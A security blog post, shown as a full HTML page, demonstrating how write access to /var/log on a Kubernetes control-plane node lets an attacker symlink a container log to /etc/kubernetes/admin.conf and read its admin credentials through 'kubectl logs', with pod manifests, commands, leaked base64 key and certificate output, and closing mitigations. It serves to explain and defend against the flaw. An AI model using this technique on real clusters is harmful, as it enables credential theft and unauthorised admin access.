<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Exploiting Access to the /var/log Folder | Linus Östberg</title><meta name=keywords content="containers,security,kubernetes"><meta name=description content="A way to exploit access to the /var/log to obtain admin rights in a cluster."><meta name=author content="Linus Östberg"><link rel=canonical href=https://linus.oestberg.dev/posts/exploiting-var-log-permissions/><link crossorigin=anonymous href=/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF+13Dyqob6ASlTrTye8=" rel="preload stylesheet" as=style><link rel=icon href=https://linus.oestberg.dev/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://linus.oestberg.dev/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://linus.oestberg.dev/favicon-32x32.png><link rel=apple-touch-icon href=https://linus.oestberg.dev/apple-touch-icon.png><link rel=mask-icon href=https://linus.oestberg.dev/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://linus.oestberg.dev/posts/exploiting-var-log-permissions/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://linus.oestberg.dev/posts/exploiting-var-log-permissions/"><meta property="og:site_name" content="Linus Östberg"><meta property="og:title" content="Exploiting Access to the /var/log Folder"><meta property="og:description" content="A way to exploit access to the /var/log to obtain admin rights in a cluster."><meta property="og:locale" content="en-gb"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-02-25T13:10:00+01:00"><meta property="article:modified_time" content="2026-02-25T13:10:00+01:00"><meta property="article:tag" content="Containers"><meta property="article:tag" content="Security"><meta property="article:tag" content="Kubernetes"><meta name=twitter:card content="summary"><meta name=twitter:title content="Exploiting Access to the /var/log Folder"><meta name=twitter:description content="A way to exploit access to the /var/log to obtain admin rights in a cluster."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://linus.oestberg.dev/posts/"},{"@type":"ListItem","position":2,"name":"Exploiting Access to the /var/log Folder","item":"https://linus.oestberg.dev/posts/exploiting-var-log-permissions/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Exploiting Access to the /var/log Folder","name":"Exploiting Access to the \/var\/log Folder","description":"A way to exploit access to the /var/log to obtain admin rights in a cluster.","keywords":["containers","security","kubernetes"],"articleBody":"I have more than once been met with confusion when I ask if the team responsible for extracting and saving logs from Kubernetes clusters are trusted enough to have admin rights. It seems to be a recurring belief that a user with access to the /var/log folders is not a privileged user. I do not agree.\nFirst of all: a user with access to /var/log has to be trusted to not manipulate the logs. But access to the /var/log folder on a node in a Kubernetes cluster also provides an indirect route to access any other files in the host filesystem. This includes /etc/shadow and other sensitive files, including the /etc/kubernetes/admin.conf in kubeadm-based clusters, which contain credentials providing admin rights in the cluster.\nAccessing the Host Filesystem Interactive version available at Killercoda\nLet’s start of with a simple pod that mounts the /var/log folder using a hostPath. It is intended to run on a control plane node.\n--- # logs.yaml apiVersion: v1 kind: Pod metadata: labels: demo: logs name: logs spec: nodeSelector: node-role.kubernetes.io/control-plane: \"\" tolerations: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane - effect: NoSchedule key: node-role.kubernetes.io/etcd containers: - image: ubuntu name: logs command: - sleep - \"36000\" volumeMounts: - name: logs mountPath: /logs volumes: - name: logs hostPath: path: /var/log type: Directory There will also be a simple helper pod that simply needs to exist. It doesn’t really matter what it does, but in this case it will continously output the string “lostb-is-here”. It should run on the same node as the logs pod.\n--- # gen.yaml apiVersion: v1 kind: Pod metadata: labels: run: generator name: generator spec: affinity: podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: demo: logs topologyKey: kubernetes.io/hostname tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane - effect: NoSchedule key: node-role.kubernetes.io/etcd containers: - image: ubuntu name: generator command: [\"bash\", \"-c\", \"while : ; do echo lostb-is-here ; sleep 60 ; done\"] Let’s start the two pods:\n$ kubectl apply -f logs.yaml -f gen.yaml And start an interactive shell in the container with access to /var/log:\n$ kubectl exec -it logs -- bash The container logs are available under /logs/pods (/var/log/pods on the host). The logs are divided into folders based on namespace, pod name, and a hash, namespace_pod_hash. The logs for the generator pod is available in a folder with the name default_generator_. The pod folder in turn contains a folder for each running container. As the container is called generator, it will also be the name of the folder.\n$ cd /logs/pods/default_gen*/generator The container folder contains a file called 0.log which contains the container logs.\n$ cat 0.log stdout F lostb-is-here stdout F lostb-is-here This is the file that is read when you run kubectl logs. In order to exploit our (write!) access to the log folder, this file will be deleted and replaced with a symlink to the /etc/kubernetes/admin.conf file, which contains a kubeconfig file that provides admin permissions in kubeadm clusters. Other Kubernetes distributions will have a similar file, but at a different path.\n$ rm 0.log $ ln -s /etc/kubernetes/admin.conf 0.log Let’s try to access the admin file:\n$ cat 0.log cat: 0.log: No such file or directory It didn’t work as we do not have the requested file in our filesystem. It seems we are safe, right? Let’s try leaving the container and accessing the logs via `kubectl logs´ instead.\n$ exit $ kubectl logs generator failed to get parse function: unsupported log format: \"apiVersion: v1\\n\" That was not the expected log. There is a mention of apiVersion: v1 that seems to originate in the target admin kubeconfig. How did that happen? The answer is simple: when you run kubectl logs, the kubelet is accessing the logs. Since the kubelet is running in the context of the host, it can follow the symlink and access the file. As the file format does not match the expected stdout F , the file is not printed in its entirety. However, the file can still be accessed if we request the logs row by row:\n$ kubectl logs generator --tail=1 failed to get parse function: unsupported log format: \" client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBdzFyQ2ovSi9yd3M4bWJ3Zlk3aDYra0h4dDY3aHUvM2VaL0ZNMFczOHZNbnlXRWtKCkpHUFE5MXJhMWdzbEdOc3FPRU1xZUt1QmtGN1lUbFgxb0NvTVBkenplTWZ3YlRiVWV3bWprb0F5dnVtaDFuTUoKdDRWczZodGliNmZEUDZrbmhRRU13VVpVOHc0TVdVdkJZc1ptQUZSazhIa1ZmNmhvaGFnTm5wZHRhZ3piVmJMMAoweHErNXBYeldqQXgvOXo3ajVJZ1RWSjlPN3hrOE14V1FXQmhEdlJhM0NaUkszdzBUQUJoSldyVndDNFVoeCs5CkxGcXUzd2Zvc0h0QTJlc3lKZ3BOV0ttZEwwQk1UT2lyeW92YTVaWWpKbVRCeHhUWmpZc2xBSGVVMi82TlV1NVQKNi9VelVzTFYwUGkwS2VyMElqNTZpMXdVTGNleTFmeHBTTkJ2UlFJREFRQUJBb0lCQUFNUGdUUlZvWVA1eWxlRApQNytsZElIR3RqV0JQeWFkbGRZdGpOMU1HcFZQbWFVaDhjdDQ1OTEwTmpEN3lEZEJPY0piWlFjeWNxdHpIUEx2ClBGT256UHpNSVNGZmlvZi9mNmswejdQOEg2OW5oQ0pTdDVDQlBlRldELzc5VXgwRWRxcktCeXZoQVBRMDRHTW0Kd1c4ZGVod2Z0bHdoSFlIY1B0VDNPczFsQkhFUW52eitZdTZHdXZ6YnlxeW96MzlmMjR6M1JJdnI0d3RubUhIUAo0YUwwU0J1UzRMQU8rOHRzVTd0SHhNZEpyd2tJNHFuSFdZeU9TY1p5RnJIK25YZVZpa0FUR25UNEFFUXJKdGcvCmdrRjNSYi9DbCszT0w5Ny9mQnV4VnM2OXpqTjZzZzNJMllhVnpvZ2o0VmhCTlVvRVoxQm9LMVVQdHZIK0xMYXoKamhDbzQ0RUNnWUVBNkJCSmJ0ZjAxMW5TWTZMQTl1MjhTblBERyt4OFpWcG1BWlU5eE1UWkd0Nm4xNC9DN3c2MQoxTWhUVjY2WkpzNStyTkRuZXNUWUJtRkRQc09SN3h3ay9UaWpxa3BNaUZBUnBGNG80Yk5LVXVqRmxHZlE0WnloClVGZFFEMmJSZUU5RWdKK1IyZkdZUHBqWGlhYnhxVFFXWkJ5dERnbFRsRTFSWWtBVCtjSDRZc1VDZ1lFQTE0RW8KZDNxejFSUEUzTFdoYm9Mc2FkZ1pNSlpWa21wdksvZU9kTnE3dmljVHlaQXAweFVUNEZROW9rb2kwbnRGNDVhTgpNd2dlcUE4WmRwcmQzQkhyNVp5WGoyZENwLzh0NTVsajJRNlZzRjczS0J1Y2Z2Rno4aUs3M1F0Z3IvVW8zbVI0CjRwYWNRYmhoKzRqU2ZFbCt0ZGV5QnNrMGtTZE43eURYdWZYdW9vRUNnWUFiVnZmZnlDOS9RNFRHMmtEVGxwU04KVFBBYWxSVGV0L1Mya1FlUzdBSUw2VmxxeXZRVFIrOWlIeXU2YzhaMVRQU2RsWXIvNnJyc25YN1hvU0RMUTh5VAp6SjF6allkUXMrWXdNQ3V1MDNtWkpQVktFNlVIUDNXOXlsdVRSUEMrdE5BRU8waHFuY3pxNndUUm9jcHN2Y2M1CmlpdFZNUUlZd2JjcDFSVEZZdlhKWlFLQmdFQXBQQnNXZFNRalZxRS9rbWlNb2thQkNEN25BMk1zUFIwaC8wL2IKTDdwVmVCYXl6VUVETFgvRWxQVVVqWG1OS2ltd1VTbTRhU2d3RnF5eFB3eWVhVlZiWWVSWUlnaFNlU0JURXQ4MAo4R3dxV2Z1ZS9PRHVrazZzK0xHL0NYSlowMmtqRUxxbGpMQWtiVWV1WEx5VVJSMXVzcHBDblZ2NkQ4SDZUVUFZCmNJd0JBb0dCQUpSRFhMajJ3dmN3TEdielJLSmtqVTgzd1ZwOXR2YmNLU01GMzRLN0hYeDJiZ20yK2VGK1kvY0UKbmpyK2dDN0c2VnpNYjl1VHBIRGE4WkVoamM0YTU0eHFlZFpTVWU2UitsSGk4a3MrQU4xSUl4d1l3bnk1UklzaQpWMlgyTFhjY1hUYUNFN090L0UrRzQzeXMwQWFEWDRabG1SK3l3K2FSR0h0VktNdWJ0T29nCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==\\n\" $ kubectl logs generator --tail=2 failed to get parse function: unsupported log format: \" client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURLVENDQWhHZ0F3SUJBZ0lJUCtPT0NwQ0pDK2d3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TmpBeE16RXlNalE1TkRCYUZ3MHlOekF4TXpFeU1qVTBOREJhTUR3eApIekFkQmdOVkJBb1RGbXQxWW1WaFpHMDZZMngxYzNSbGNpMWhaRzFwYm5NeEdUQVhCZ05WQkFNVEVHdDFZbVZ5CmJtVjBaWE10WVdSdGFXNHdnZ0VpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElCRHdBd2dnRUtBb0lCQVFERFdzS1AKOG4rdkN6eVp2QjlqdUhyNlFmRzNydUc3L2Q1bjhVelJiZnk4eWZKWVNRa2tZOUQzV3RyV0N5VVkyeW80UXlwNApxNEdRWHRoT1ZmV2dLZ3c5M1BONHgvQnROdFI3Q2FPU2dESys2YUhXY3dtM2hXenFHMkp2cDhNL3FTZUZBUXpCClJsVHpEZ3haUzhGaXhtWUFWR1R3ZVJWL3FHaUZxQTJlbDIxcUROdFZzdlRUR3I3bWxmTmFNREgvM1B1UGtpQk4KVW4wN3ZHVHd6RlpCWUdFTzlGcmNKbEVyZkRSTUFHRWxhdFhBTGhTSEg3MHNXcTdmQitpd2UwRFo2ekltQ2sxWQpxWjB2UUV4TTZLdktpOXJsbGlNbVpNSEhGTm1OaXlVQWQ1VGIvbzFTN2xQcjlUTlN3dFhRK0xRcDZ2UWlQbnFMClhCUXR4N0xWL0dsSTBHOUZBZ01CQUFHalZqQlVNQTRHQTFVZER3RUIvd1FFQXdJRm9EQVRCZ05WSFNVRUREQUsKQmdnckJnRUZCUWNEQWpBTUJnTlZIUk1CQWY4RUFqQUFNQjhHQTFVZEl3UVlNQmFBRkt3RmkrQVdwRWk5UllkYQpiSWVJMWRVTXEva3lNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUJBUUJyMElVN3p0dlFrOEl2eFRjbDJNMmdwVGtXCnp3QlpKN0hUTmZGK2VtbW9pWUpXMXFGWXJCKzVnVGVQYmNDOWhkK3N2b0MwcTlJMS9Zc2pqNDVYbFU3eXI2NEMKMlRrd1lnOWJZMUxsSk8zeHJaUW9XOC9VYmcxNncxaGJoRzBNbDlkb2NpdHJSa2NXVDhtUWZUOXJpSHdEdUxPUApvMUxua3A4ekNRVzlOd3A3UEdPT2FiajBaQk8zRXB0K3NTWW1PL3J0RngxK21ET3dhRGVQaHoxNldaY1ZuTnF0CnJlSXBFVzRjRWlBOVJFb0JwTWRaaHhGZ20zU2hFRzRTZWU4S1RSamlGeTlKL2xQa3o4T0RyZlBjbXRLNm9ieWoKak5hQ1RkTWc1c1RXcWFLOHh3c0FSWG1jSVV5THIrQW9SWGpISWxDUHloKzNyUU5FTXVtZEdVZk1vbVpUCi0tLS0tRU5EIENFUl And thus we can extract the file and obtain admin rights.\nHow can this be stopped? The easiest way is to simply make sure that everyone who has access to the log folder are users that have (or would be trusted to have) admin rights. Another way is to follow the least privilege principles and make sure the logging pods are not given write permissions.\n","wordCount":"775","inLanguage":"en","datePublished":"2026-02-25T13:10:00+01:00","dateModified":"2026-02-25T13:10:00+01:00","author":[{"@type":"Person","name":"Linus Östberg"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://linus.oestberg.dev/posts/exploiting-var-log-permissions/"},"publisher":{"@type":"Organization","name":"Linus Östberg","logo":{"@type":"ImageObject","url":"https://linus.oestberg.dev/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://linus.oestberg.dev/ accesskey=h title="Home (Alt + H)"><img src=https://linus.oestberg.dev/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://linus.oestberg.dev/tags/ title=tags><span>tags</span></a></li><li><a href=https://linus.oestberg.dev/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Exploiting Access to the /var/log Folder</h1><div class=post-description>A way to exploit access to the /var/log to obtain admin rights in a cluster.</div><div class=post-meta><span title='2026-02-25 13:10:00 +0100 +0100'>February 25, 2026</span>&nbsp;·&nbsp;Linus Östberg</div></header><div class=post-content><p>I have more than once been met with confusion when I ask if the team responsible for extracting and saving logs from Kubernetes clusters are trusted enough to have admin rights. It seems to be a recurring belief that a user with access to the <code>/var/log</code> folders is not a privileged user. I do not agree.</p><p>First of all: a user with access to <code>/var/log</code> has to be trusted to not manipulate the logs. But access to the <code>/var/log</code> folder on a node in a Kubernetes cluster also provides an indirect route to access any other files in the host filesystem. This includes <code>/etc/shadow</code> and other sensitive files, including the <code>/etc/kubernetes/admin.conf</code> in kubeadm-based clusters, which contain credentials providing admin rights in the cluster.</p><h1 id=accessing-the-host-filesystem>Accessing the Host Filesystem<a hidden class=anchor aria-hidden=true href=#accessing-the-host-filesystem>#</a></h1><p><em>Interactive version available at <a href=https://killercoda.com/lostb/scenario/exploiting-var-log>Killercoda</a></em></p><p>Let&rsquo;s start of with a simple pod that mounts the <code>/var/log</code> folder using a <code>hostPath</code>. It is intended to run on a control plane node.</p><pre tabindex=0><code>---
# logs.yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    demo: logs
  name: logs
spec:
  nodeSelector:
    node-role.kubernetes.io/control-plane: &#34;&#34;
  tolerations:
    tolerations:
    - effect: NoSchedule
      key: node-role.kubernetes.io/master
    - effect: NoSchedule
      key: node-role.kubernetes.io/control-plane
    - effect: NoSchedule
      key: node-role.kubernetes.io/etcd
  containers:
  - image: ubuntu
    name: logs
    command:
      - sleep
      - &#34;36000&#34;
    volumeMounts:
    - name: logs
      mountPath: /logs
  volumes:
    - name: logs
      hostPath:
        path: /var/log
        type: Directory
</code></pre><p>There will also be a simple helper pod that simply needs to exist. It doesn&rsquo;t really matter what it does, but in this case it will continously output the string &ldquo;lostb-is-here&rdquo;. It should run on the same node as the <code>logs</code> pod.</p><pre tabindex=0><code>---
# gen.yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: generator
  name: generator
spec:
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
      - labelSelector:
          matchLabels:
            demo: logs
        topologyKey: kubernetes.io/hostname
  tolerations:
    - effect: NoSchedule
      key: node-role.kubernetes.io/master
    - effect: NoSchedule
      key: node-role.kubernetes.io/control-plane
    - effect: NoSchedule
      key: node-role.kubernetes.io/etcd
  containers:
  - image: ubuntu
    name: generator
    command: [&#34;bash&#34;, &#34;-c&#34;, &#34;while : ; do echo lostb-is-here ; sleep 60 ; done&#34;]
</code></pre><p>Let&rsquo;s start the two pods:</p><pre tabindex=0><code>$ kubectl apply -f logs.yaml -f gen.yaml
</code></pre><p>And start an interactive shell in the container with access to <code>/var/log</code>:</p><pre tabindex=0><code>$ kubectl exec -it logs -- bash
</code></pre><p>The container logs are available under <code>/logs/pods</code> (<code>/var/log/pods</code> on the host). The logs are divided into folders based on namespace, pod name, and a hash, <code>namespace_pod_hash</code>. The logs for the generator pod is available in a folder with the name <code>default_generator_&lt;hash></code>. The pod folder in turn contains a folder for each running container. As the container is called <code>generator</code>, it will also be the name of the folder.</p><pre tabindex=0><code>$ cd /logs/pods/default_gen*/generator
</code></pre><p>The container folder contains a file called <code>0.log</code> which contains the container logs.</p><pre tabindex=0><code>$ cat 0.log
&lt;timestamp&gt; stdout F lostb-is-here
&lt;timestamp&gt; stdout F lostb-is-here
</code></pre><p>This is the file that is read when you run <code>kubectl logs</code>. In order to exploit our (write!) access to the log folder, this file will be deleted and replaced with a symlink to the <code>/etc/kubernetes/admin.conf</code> file, which contains a kubeconfig file that provides admin permissions in <code>kubeadm</code> clusters. Other Kubernetes distributions will have a similar file, but at a different path.</p><pre tabindex=0><code>$ rm 0.log
$ ln -s /etc/kubernetes/admin.conf 0.log
</code></pre><p>Let&rsquo;s try to access the admin file:</p><pre tabindex=0><code>$ cat 0.log
cat: 0.log: No such file or directory
</code></pre><p>It didn&rsquo;t work as we do not have the requested file in our filesystem. It seems we are safe, right? Let&rsquo;s try leaving the container and accessing the logs via `kubectl logs´ instead.</p><pre tabindex=0><code>$ exit
$ kubectl logs generator
failed to get parse function: unsupported log format: &#34;apiVersion: v1\n&#34;
</code></pre><p>That was not the expected log. There is a mention of <code>apiVersion: v1</code> that seems to originate in the target admin kubeconfig. How did that happen? The answer is simple: when you run <code>kubectl logs</code>, the kubelet is accessing the logs. Since the kubelet is running in the context of the host, it can follow the symlink and access the file. As the file format does not match the expected <code>&lt;timestamp> stdout F &lt;log></code>, the file is not printed in its entirety. However, the file can still be accessed if we request the logs row by row:</p><pre tabindex=0><code>$ kubectl logs generator --tail=1
failed to get parse function: unsupported log format: &#34;    client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBdzFyQ2ovSi9yd3M4bWJ3Zlk3aDYra0h4dDY3aHUvM2VaL0ZNMFczOHZNbnlXRWtKCkpHUFE5MXJhMWdzbEdOc3FPRU1xZUt1QmtGN1lUbFgxb0NvTVBkenplTWZ3YlRiVWV3bWprb0F5dnVtaDFuTUoKdDRWczZodGliNmZEUDZrbmhRRU13VVpVOHc0TVdVdkJZc1ptQUZSazhIa1ZmNmhvaGFnTm5wZHRhZ3piVmJMMAoweHErNXBYeldqQXgvOXo3ajVJZ1RWSjlPN3hrOE14V1FXQmhEdlJhM0NaUkszdzBUQUJoSldyVndDNFVoeCs5CkxGcXUzd2Zvc0h0QTJlc3lKZ3BOV0ttZEwwQk1UT2lyeW92YTVaWWpKbVRCeHhUWmpZc2xBSGVVMi82TlV1NVQKNi9VelVzTFYwUGkwS2VyMElqNTZpMXdVTGNleTFmeHBTTkJ2UlFJREFRQUJBb0lCQUFNUGdUUlZvWVA1eWxlRApQNytsZElIR3RqV0JQeWFkbGRZdGpOMU1HcFZQbWFVaDhjdDQ1OTEwTmpEN3lEZEJPY0piWlFjeWNxdHpIUEx2ClBGT256UHpNSVNGZmlvZi9mNmswejdQOEg2OW5oQ0pTdDVDQlBlRldELzc5VXgwRWRxcktCeXZoQVBRMDRHTW0Kd1c4ZGVod2Z0bHdoSFlIY1B0VDNPczFsQkhFUW52eitZdTZHdXZ6YnlxeW96MzlmMjR6M1JJdnI0d3RubUhIUAo0YUwwU0J1UzRMQU8rOHRzVTd0SHhNZEpyd2tJNHFuSFdZeU9TY1p5RnJIK25YZVZpa0FUR25UNEFFUXJKdGcvCmdrRjNSYi9DbCszT0w5Ny9mQnV4VnM2OXpqTjZzZzNJMllhVnpvZ2o0VmhCTlVvRVoxQm9LMVVQdHZIK0xMYXoKamhDbzQ0RUNnWUVBNkJCSmJ0ZjAxMW5TWTZMQTl1MjhTblBERyt4OFpWcG1BWlU5eE1UWkd0Nm4xNC9DN3c2MQoxTWhUVjY2WkpzNStyTkRuZXNUWUJtRkRQc09SN3h3ay9UaWpxa3BNaUZBUnBGNG80Yk5LVXVqRmxHZlE0WnloClVGZFFEMmJSZUU5RWdKK1IyZkdZUHBqWGlhYnhxVFFXWkJ5dERnbFRsRTFSWWtBVCtjSDRZc1VDZ1lFQTE0RW8KZDNxejFSUEUzTFdoYm9Mc2FkZ1pNSlpWa21wdksvZU9kTnE3dmljVHlaQXAweFVUNEZROW9rb2kwbnRGNDVhTgpNd2dlcUE4WmRwcmQzQkhyNVp5WGoyZENwLzh0NTVsajJRNlZzRjczS0J1Y2Z2Rno4aUs3M1F0Z3IvVW8zbVI0CjRwYWNRYmhoKzRqU2ZFbCt0ZGV5QnNrMGtTZE43eURYdWZYdW9vRUNnWUFiVnZmZnlDOS9RNFRHMmtEVGxwU04KVFBBYWxSVGV0L1Mya1FlUzdBSUw2VmxxeXZRVFIrOWlIeXU2YzhaMVRQU2RsWXIvNnJyc25YN1hvU0RMUTh5VAp6SjF6allkUXMrWXdNQ3V1MDNtWkpQVktFNlVIUDNXOXlsdVRSUEMrdE5BRU8waHFuY3pxNndUUm9jcHN2Y2M1CmlpdFZNUUlZd2JjcDFSVEZZdlhKWlFLQmdFQXBQQnNXZFNRalZxRS9rbWlNb2thQkNEN25BMk1zUFIwaC8wL2IKTDdwVmVCYXl6VUVETFgvRWxQVVVqWG1OS2ltd1VTbTRhU2d3RnF5eFB3eWVhVlZiWWVSWUlnaFNlU0JURXQ4MAo4R3dxV2Z1ZS9PRHVrazZzK0xHL0NYSlowMmtqRUxxbGpMQWtiVWV1WEx5VVJSMXVzcHBDblZ2NkQ4SDZUVUFZCmNJd0JBb0dCQUpSRFhMajJ3dmN3TEdielJLSmtqVTgzd1ZwOXR2YmNLU01GMzRLN0hYeDJiZ20yK2VGK1kvY0UKbmpyK2dDN0c2VnpNYjl1VHBIRGE4WkVoamM0YTU0eHFlZFpTVWU2UitsSGk4a3MrQU4xSUl4d1l3bnk1UklzaQpWMlgyTFhjY1hUYUNFN090L0UrRzQzeXMwQWFEWDRabG1SK3l3K2FSR0h0VktNdWJ0T29nCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==\n&#34;

$ kubectl logs generator --tail=2
failed to get parse function: unsupported log format: &#34;    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURLVENDQWhHZ0F3SUJBZ0lJUCtPT0NwQ0pDK2d3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TmpBeE16RXlNalE1TkRCYUZ3MHlOekF4TXpFeU1qVTBOREJhTUR3eApIekFkQmdOVkJBb1RGbXQxWW1WaFpHMDZZMngxYzNSbGNpMWhaRzFwYm5NeEdUQVhCZ05WQkFNVEVHdDFZbVZ5CmJtVjBaWE10WVdSdGFXNHdnZ0VpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElCRHdBd2dnRUtBb0lCQVFERFdzS1AKOG4rdkN6eVp2QjlqdUhyNlFmRzNydUc3L2Q1bjhVelJiZnk4eWZKWVNRa2tZOUQzV3RyV0N5VVkyeW80UXlwNApxNEdRWHRoT1ZmV2dLZ3c5M1BONHgvQnROdFI3Q2FPU2dESys2YUhXY3dtM2hXenFHMkp2cDhNL3FTZUZBUXpCClJsVHpEZ3haUzhGaXhtWUFWR1R3ZVJWL3FHaUZxQTJlbDIxcUROdFZzdlRUR3I3bWxmTmFNREgvM1B1UGtpQk4KVW4wN3ZHVHd6RlpCWUdFTzlGcmNKbEVyZkRSTUFHRWxhdFhBTGhTSEg3MHNXcTdmQitpd2UwRFo2ekltQ2sxWQpxWjB2UUV4TTZLdktpOXJsbGlNbVpNSEhGTm1OaXlVQWQ1VGIvbzFTN2xQcjlUTlN3dFhRK0xRcDZ2UWlQbnFMClhCUXR4N0xWL0dsSTBHOUZBZ01CQUFHalZqQlVNQTRHQTFVZER3RUIvd1FFQXdJRm9EQVRCZ05WSFNVRUREQUsKQmdnckJnRUZCUWNEQWpBTUJnTlZIUk1CQWY4RUFqQUFNQjhHQTFVZEl3UVlNQmFBRkt3RmkrQVdwRWk5UllkYQpiSWVJMWRVTXEva3lNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUJBUUJyMElVN3p0dlFrOEl2eFRjbDJNMmdwVGtXCnp3QlpKN0hUTmZGK2VtbW9pWUpXMXFGWXJCKzVnVGVQYmNDOWhkK3N2b0MwcTlJMS9Zc2pqNDVYbFU3eXI2NEMKMlRrd1lnOWJZMUxsSk8zeHJaUW9XOC9VYmcxNncxaGJoRzBNbDlkb2NpdHJSa2NXVDhtUWZUOXJpSHdEdUxPUApvMUxua3A4ekNRVzlOd3A3UEdPT2FiajBaQk8zRXB0K3NTWW1PL3J0RngxK21ET3dhRGVQaHoxNldaY1ZuTnF0CnJlSXBFVzRjRWlBOVJFb0JwTWRaaHhGZ20zU2hFRzRTZWU4S1RSamlGeTlKL2xQa3o4T0RyZlBjbXRLNm9ieWoKak5hQ1RkTWc1c1RXcWFLOHh3c0FSWG1jSVV5THIrQW9SWGpISWxDUHloKzNyUU5FTXVtZEdVZk1vbVpUCi0tLS0tRU5EIENFUl
</code></pre><p>And thus we can extract the file and obtain admin rights.</p><p>How can this be stopped? The easiest way is to simply make sure that everyone who has access to the log folder are users that have (or would be trusted to have) admin rights. Another way is to follow the least privilege principles and make sure the logging pods are not given write permissions.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://linus.oestberg.dev/tags/containers/>Containers</a></li><li><a href=https://linus.oestberg.dev/tags/security/>Security</a></li><li><a href=https://linus.oestberg.dev/tags/kubernetes/>Kubernetes</a></li></ul><nav class=paginav><a class=next href=https://linus.oestberg.dev/posts/container-lifecycle-hooks/><span class=title>Next »</span><br><span>Container Lifecycle Hooks May Block Pod Creation and Termination</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://linus.oestberg.dev/>Linus Östberg</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
